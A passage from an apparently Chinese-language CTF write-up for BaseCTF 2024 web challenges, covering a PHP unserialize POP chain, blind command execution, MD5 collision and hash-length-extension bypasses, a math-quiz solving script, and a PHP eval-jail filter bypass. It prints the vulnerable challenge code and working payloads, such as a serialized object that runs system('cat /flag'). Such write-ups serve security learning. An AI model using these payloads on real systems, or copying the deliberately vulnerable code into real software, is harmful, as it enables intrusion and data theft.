class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$nature</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​老样子，先分析</p><p>​Sink类的<code>__toString()</code>魔术方法中存在可控的<code>eval()</code>函数，找到了利用点，这是我们的目标</p><p>​Shark类的<code>__invoke()</code>魔术方法存在字符串拼接，可触发<code>__toString()</code>魔术方法</p><p>​Sea类的<code>__get($name)</code>魔术方法将<code>$sea_ani()</code>调用为函数，可触发<code>__invoke()</code>魔术方法</p><p>​Nature类的<code>__destruct()</code>魔术方法访问了不存在的属性see，可触发<code>__get($name)</code>魔术方法</p><p>​<code>__destruct()</code>魔术方法在对象销毁时自动触发</p><p>​至此，利用链分析完毕</p><p>​但是有些变量是<code>private</code>而非<code>public</code>，这就需要我们手动修改下了</p><p>​先将<code>private</code>改为<code>public</code>，生成基础payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo 123;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Nature</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Sea</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Sink</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;sea=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;animal=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;word=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;cmd=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​得到基础payload：<code>O:6:&quot;Nature&quot;:1:&#123;s:3:&quot;sea&quot;;O:3:&quot;Sea&quot;:1:&#123;s:6:&quot;animal&quot;;O:5:&quot;Shark&quot;:1:&#123;s:4:&quot;word&quot;;O:4:&quot;Sink&quot;:1:&#123;s:3:&quot;cmd&quot;;s:20:&quot;system(&#39;cat /flag&#39;);&quot;;&#125;&#125;&#125;&#125;</code></p><p>​对于非public变量，序列化后变量遵循:<br>​\0 + 类名 + \0 + 变量名 ‐&gt; 反序列化为private变量<br>​\0 + * + \0 + 变量名 ‐&gt; 反序列化为protected变量<br>​在浏览器中，可能需要将\0换成%00</p><p>​因此修改payload为<code>O:6:&quot;Nature&quot;:1:&#123;s:3:&quot;sea&quot;;O:3:&quot;Sea&quot;:1:&#123;s:6:&quot;animal&quot;;O:5:&quot;Shark&quot;:1:&#123;s:11:&quot;%00Shark%00word&quot;;O:4:&quot;Sink&quot;:1:&#123;s:9:&quot;%00Sink%00cmd&quot;;s:20:&quot;system(&#39;cat /flag&#39;);&quot;;&#125;&#125;&#125;&#125;</code></p><p>​POST传参即可</p><h2 id="一起吃豆豆"><a href="#一起吃豆豆" class="headerlink" title="一起吃豆豆"></a>一起吃豆豆</h2><h3 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h3><p>​大家都爱玩的JS小游戏</p><h3 id="考点-9"><a href="#考点-9" class="headerlink" title="考点"></a>考点</h3><p>​JS代码审计</p><h3 id="题解-9"><a href="#题解-9" class="headerlink" title="题解"></a>题解</h3><p>​一个JS小游戏，flag大概率藏在js中，又因为js代码基本都是在浏览器本地运行的，所以我们可以直接进行代码审计</p><p>​当审计到index.js的第1046行时注意到了一串可疑的base64编码后的字符串，解码后即为flag</p><h2 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音"></a>你听不到我的声音</h2><h3 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h3><p>​我要执行 shell 指令啦! 诶? 他的输出是什么? 为什么不给我?</p><h3 id="考点-10"><a href="#考点-10" class="headerlink" title="考点"></a>考点</h3><ul><li>无回显命令执行</li></ul><h3 id="题解-10"><a href="#题解-10" class="headerlink" title="题解"></a>题解</h3><p>​题面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>​对于这种无回显命令执行，一是可以直接反弹shell，二是可以通过<code>&lt;</code> <code>&gt;</code>来写入文件，三是可以通过<code>highlight_file()</code>显示文件</p><p>​比如说可以POST传参<code>cmd=cat /flag &gt; flag.txt</code>，然后访问&#x2F;flag.txt路径即可获得flag</p><h2 id="所以你说你懂-MD5"><a href="#所以你说你懂-MD5" class="headerlink" title="所以你说你懂 MD5?"></a>所以你说你懂 MD5?</h2><h3 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h3><p>​所以你说你懂 MD5?</p><h3 id="考点-11"><a href="#考点-11" class="headerlink" title="考点"></a>考点</h3><ul><li><p>php弱比较</p></li><li><p>md5强碰撞</p></li><li><p>哈希拓展攻击</p></li></ul><h3 id="题解-11"><a href="#题解-11" class="headerlink" title="题解"></a>题解</h3><p>​题面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 所以你说你懂 MD5 了?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$apple</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;banana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$apple</span> !== <span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;加强难度就不会了?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 什么? 你绕过去了?</span></span><br><span class="line"><span class="comment">// 加大剂量!</span></span><br><span class="line"><span class="comment">// 我要让他成为 string</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;appple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;bananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) == <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;难吗?不难!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你还是绕过去了?</span></span><br><span class="line"><span class="comment">// 哦哦哦, 我少了一个等于号</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;apppple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;banananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你以为这就结束了</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你想看到 random 的值吗?</span></span><br><span class="line"><span class="comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span></span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$random</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if name ends with &#x27;admin&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">5</span>) !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;不是管理员也来凑热闹?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$random</span> . <span class="variable">$name</span>) !== <span class="variable">$md5</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;伪造? NO NO NO!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 认输了, 看样子你真的很懂 MD5</span></span><br><span class="line"><span class="comment">// 那 flag 就给你吧</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;看样子你真的很懂 MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure><p>​观察发现最后可以获得flag，但是前面有五次判断</p><p>​首先对于第一次判断，传数组即可通过强比较，即<code>apple[]=1&amp;banana[]=2</code></p><p>​对于第二次判断，属于md5弱比较，利用0e漏洞即可，即<code>appple=314282422&amp;bananana=571579406</code></p><p>​对于第三次判断，属于强比较，并且使用了<code>(string)</code>，需要进行md5强碰撞，使用fastcoll这个工具即可生成两个内容不一样但是md5值相同的文件，例如<code>apppple=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;banananana=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></p><p>​对于第四次判断，只要让<code>$md5</code>的最后5位是admin即可</p><p>​对于第五次判断，则需要用到哈希长度拓展攻击，可使用工具hashpump<img src="/../post_img/633096d238827efa349111abeadee67d/basectf2024_week2_web_md5_1.png" alt="basectf2024_week2_web_md5_1"></p><p>​分别传入生成的<code>$name</code>和<code>$md5</code>即可</p><p>​综合即为</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apple[]=<span class="number">1</span>&amp;banana[]=<span class="number">2</span>&amp;appple=<span class="number">314282422</span>&amp;bananana=<span class="number">571579406</span>&amp;apppple=<span class="meta">%4d</span><span class="meta">%c9</span><span class="meta">%68</span><span class="meta">%ff</span><span class="meta">%0e</span><span class="meta">%e3</span><span class="meta">%5c</span><span class="meta">%20</span><span class="meta">%95</span><span class="meta">%72</span><span class="meta">%d4</span><span class="meta">%77</span><span class="meta">%7b</span><span class="meta">%72</span><span class="meta">%15</span><span class="meta">%87</span><span class="meta">%d3</span><span class="meta">%6f</span><span class="meta">%a7</span><span class="meta">%b2</span><span class="meta">%1b</span><span class="meta">%dc</span><span class="meta">%56</span><span class="meta">%b7</span><span class="meta">%4a</span><span class="meta">%3d</span><span class="meta">%c0</span><span class="meta">%78</span><span class="meta">%3e</span><span class="meta">%7b</span><span class="meta">%95</span><span class="meta">%18</span><span class="meta">%af</span><span class="meta">%bf</span><span class="meta">%a2</span><span class="meta">%00</span><span class="meta">%a8</span><span class="meta">%28</span><span class="meta">%4b</span><span class="meta">%f3</span><span class="meta">%6e</span><span class="meta">%8e</span><span class="meta">%4b</span><span class="meta">%55</span><span class="meta">%b3</span><span class="meta">%5f</span><span class="meta">%42</span><span class="meta">%75</span><span class="meta">%93</span><span class="meta">%d8</span><span class="meta">%49</span><span class="meta">%67</span><span class="meta">%6d</span><span class="meta">%a0</span><span class="meta">%d1</span><span class="meta">%55</span><span class="meta">%5d</span><span class="meta">%83</span><span class="meta">%60</span><span class="meta">%fb</span><span class="meta">%5f</span><span class="meta">%07</span><span class="meta">%fe</span><span class="meta">%a2</span>&amp;banananana=<span class="meta">%4d</span><span class="meta">%c9</span><span class="meta">%68</span><span class="meta">%ff</span><span class="meta">%0e</span><span class="meta">%e3</span><span class="meta">%5c</span><span class="meta">%20</span><span class="meta">%95</span><span class="meta">%72</span><span class="meta">%d4</span><span class="meta">%77</span><span class="meta">%7b</span><span class="meta">%72</span><span class="meta">%15</span><span class="meta">%87</span><span class="meta">%d3</span><span class="meta">%6f</span><span class="meta">%a7</span><span class="meta">%b2</span><span class="meta">%1b</span><span class="meta">%dc</span><span class="meta">%56</span><span class="meta">%b7</span><span class="meta">%4a</span><span class="meta">%3d</span><span class="meta">%c0</span><span class="meta">%78</span><span class="meta">%3e</span><span class="meta">%7b</span><span class="meta">%95</span><span class="meta">%18</span><span class="meta">%af</span><span class="meta">%bf</span><span class="meta">%a2</span><span class="meta">%02</span><span class="meta">%a8</span><span class="meta">%28</span><span class="meta">%4b</span><span class="meta">%f3</span><span class="meta">%6e</span><span class="meta">%8e</span><span class="meta">%4b</span><span class="meta">%55</span><span class="meta">%b3</span><span class="meta">%5f</span><span class="meta">%42</span><span class="meta">%75</span><span class="meta">%93</span><span class="meta">%d8</span><span class="meta">%49</span><span class="meta">%67</span><span class="meta">%6d</span><span class="meta">%a0</span><span class="meta">%d1</span><span class="meta">%d5</span><span class="meta">%5d</span><span class="meta">%83</span><span class="meta">%60</span><span class="meta">%fb</span><span class="meta">%5f</span><span class="meta">%07</span><span class="meta">%fe</span><span class="meta">%a2</span><span class="built_in">&amp;name</span>=<span class="language-xml"><span class="tag">&lt;<span class="name">yourname</span>&gt;</span>&amp;md5=</span><span class="language-xml"><span class="tag">&lt;<span class="name">yourmd5</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h2><h3 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h3><p>​Kengwang 的数学特别差, 他的计算器坏掉了, 你能快速帮他完成数学计算题吗?</p><p>​每一道题目需要在 5 秒内解出, 传入到 <code>$_POST[&#39;answer&#39;]</code> 中, 解出 50 道即可, 除法取整</p><p>​本题依赖 session，请在请求时开启 session cookie</p><h3 id="考点-12"><a href="#考点-12" class="headerlink" title="考点"></a>考点</h3><ul><li><p>python脚本编写</p></li><li><p>requets库的使用</p></li></ul><h3 id="题解-12"><a href="#题解-12" class="headerlink" title="题解"></a>题解</h3><p>​题目要求三秒内算出并提交答案，人写肯定不现实，因此需要用到python脚本，参考脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.basectf.fun:26945/&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">response = session.get(url).text</span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response = response.replace(<span class="string">&quot;×&quot;</span>, <span class="string">&quot;*&quot;</span>)</span><br><span class="line">    response = response.replace(<span class="string">&quot;÷&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    question = re.search(<span class="string">r&#x27;\d+[\+\-\*\/]\d+&#x27;</span>, response).group(<span class="number">0</span>)</span><br><span class="line">    answer = <span class="built_in">eval</span>(question)</span><br><span class="line">    post_data = &#123;</span><br><span class="line">        <span class="string">&quot;answer&quot;</span>: answer</span><br><span class="line">    &#125;</span><br><span class="line">    response = session.post(url, data=post_data).text</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Base&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="官方WP-2"><a href="#官方WP-2" class="headerlink" title="官方WP"></a>官方WP</h2><p><a href="https://j0zr0js7k7j.feishu.cn/wiki/XN3BwnHrZihQ3ZkhEyocb5EJnUd">https://j0zr0js7k7j.feishu.cn/wiki/XN3BwnHrZihQ3ZkhEyocb5EJnUd</a></p><h2 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h2><h3 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h3><p>​DT最怕坐牢了…但是包吃包住啊！</p><h3 id="考点-13"><a href="#考点-13" class="headerlink" title="考点"></a>考点</h3><ul><li><p>php解析特性</p></li><li><p>php过滤绕过</p></li></ul><h3 id="题解-13"><a href="#题解-13" class="headerlink" title="题解"></a>题解</h3><p>​题面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;hint.html&quot;</span>);</span><br><span class="line"><span class="variable">$Jail</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Jail_by.Happy&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$Jail</span> == <span class="literal">null</span>) <span class="keyword">die</span>(<span class="string">&quot;Do You Like My Jail?&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Like_Jail</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(`|\$|a|c|s|require|include)/i&#x27;</span>, <span class="variable">$var</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">Like_Jail</span>(<span class="variable">$Jail</span>)) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$Jail</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Yes! you escaped from the jail! LOL!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You will Jail in your life!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">// 在HTML解析后再输出PHP源代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​审计发现包含hint.html，尝试读取</p><p><img src="/../post_img/633096d238827efa349111abeadee67d/basectf2024_week2_web_phpjail_1.png" alt="basectf2024_week2_web_phpjail_1"></p><p>​hint在<code>./cGgwX2luZm9fTGlrZV9qYWlsLnBocA==</code>，base64解码为<code>ph0_info_Like_jail.php</code>，尝试访问，发现返回的是</p><p><img src="/../post_img/633096d238827efa349111abeadee67d/basectf2024_week2_web_phpjail_2.png" alt="basectf2024_week2_web_phpjail_2"></p><p><img src="/../post_img/633096d238827efa349111abeadee67d/basectf2024_week2_web_phpjail_3.png" alt="basectf2024_week2_web_phpjail_3"></p><p>​得到php版本为7.4.27，且大部分命令执行函数都被禁止了</p><p>​尝试传参<code>Jail_by.Happy=1</code>，但提示<code>Do You Like My Jail?</code>，这是因为php在解析时会把<code>.</code>替换为<code>_</code>，而在小于8的php版本中，<code>[</code>会被转化为<code>_</code>，其之后的<code>.</code>不会再被转化，因此需要传<code>Jail[by.Happy=1</code>，这样就不会提示<code>Do You Like My Jail?</code>了</p><p>​命令执行函数被禁了，文件包含函数也被禁了，但还可以使用<code>highlight_file()</code>来读取文件，但又因为<code>a</code>被禁了，因此需要用到通配符，猜测flag在根目录下，结合目录变量漏洞，构造<code>Jail[by.Happy=highlight_file(glob(&quot;../../../../fl*g&quot;)[0]);</code></p><p>​glob() 函数返回匹配指定模式的文件名或目录，该函数返回一个包含有匹配文件 &#x2F; 目录的数组。</p><h2 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h2><h3 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h3><p>​一位复读机发明了一个复读机来复读flag</p><h3 id="考点-14"><a href="#考点-14" class="headerlink" title="考点"></a>考点</h3><ul><li>SSTI模板注入</li></ul><h3 id="题解-14"><a 